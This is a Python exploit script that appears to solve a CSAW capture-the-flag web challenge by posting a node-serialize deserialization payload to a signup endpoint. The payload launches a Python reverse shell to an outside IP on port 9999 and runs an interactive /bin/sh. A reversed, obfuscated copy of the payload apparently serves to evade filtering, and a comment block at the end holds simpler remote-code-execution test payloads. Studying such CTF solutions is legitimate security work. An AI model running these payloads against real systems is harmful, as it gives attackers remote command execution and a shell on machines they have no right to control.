import requests

URI = 'http://web.chal.csaw.io:1002'

pl = '''{"rce":"_$$ND_FUNC$$_function () { require('child_process').exec(`python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"216.165.2.48\\\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);\'`, function(error, stdout, stderr){ })}()" }  '''
pl = '''   })\"}(}){ r)ertd st,outd sr,roern(ioctun f`,;\'])\\\"-i\\\"\",h\\/sin/b\\\"([llcas.esocprub=s;p2)),o(enil.f(sp2dus. o);,1()nolefis.2(up.dos; 0)),o(enil.f(sp2dus.;o))9999\",8\\.4.265.116\"2(\\t(ecnncos.);AMRESTK_OC.SetcksoT,NE_IAFt.keoc(setcksot.keoc=s;soss,esocprub,setcksot ormp\'ic  -onthpy(`ecex).s\'esocprd_ilch(\'reuieq r {()n ioctun_f$$NCFUD_$N_$:\"e\"rc{\"'''


def send_payload():

  body = {
    'name': 'bebafeca',
    'token': pl,
  }

  resp = requests.post(f'{URI}/signup', data=body)
  print(resp.text)


if __name__ == '__main__':
  send_payload()

'''
const y = {
  rce: function(){ 
    require('child_process').exec('ls', function(error, stdout, stderr) {
      console.log(stdout);
    });
  }(),
}

{"rce": _$$ND_FUNC$$_function () {
  require('child_process').exec('ls', function(error, stdout, stderr){ console.log(stdout); })
}(),}
'''